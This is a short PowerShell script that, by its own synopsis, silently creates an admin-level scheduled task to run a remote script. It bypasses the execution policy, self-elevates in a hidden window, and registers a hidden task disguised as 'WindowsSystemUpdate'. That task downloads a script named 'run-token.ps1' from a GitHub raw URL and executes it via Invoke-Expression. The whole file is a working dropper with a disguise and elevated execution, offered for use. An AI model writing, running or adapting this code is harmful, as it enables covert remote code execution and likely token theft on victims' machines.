<#
.SYNOPSIS
Silently creates admin scheduled task to execute remote script once.
#>

# Bypass all security warnings and restrictions
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
$ErrorActionPreference = "Stop"

# Self-elevate to admin if not already
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
    exit
}

# Main task creation
try {
    $taskName = "WindowsSystemUpdate_$(Get-Date -Format 'yyyyMMdd')"
    $startTime = (Get-Date).AddMinutes(1)
    
    # Command to execute (modify URL if needed)
    $command = @"
Start-Sleep -Seconds 30
`$webContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AFRAID-FOR-YOU/What-a-token/refs/heads/main/run-token.ps1' -UseBasicParsing
Invoke-Expression `$webContent.Content
"@

    # Create scheduled task
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$command`""
    $trigger = New-ScheduledTaskTrigger -Once -At $startTime
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
    
    # Verify creation
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Write-Host "[+] Task created successfully! It will run at $startTime" -ForegroundColor Green
    } else {
        Write-Host "[-] Task creation failed" -ForegroundColor Red
    }
}
catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}
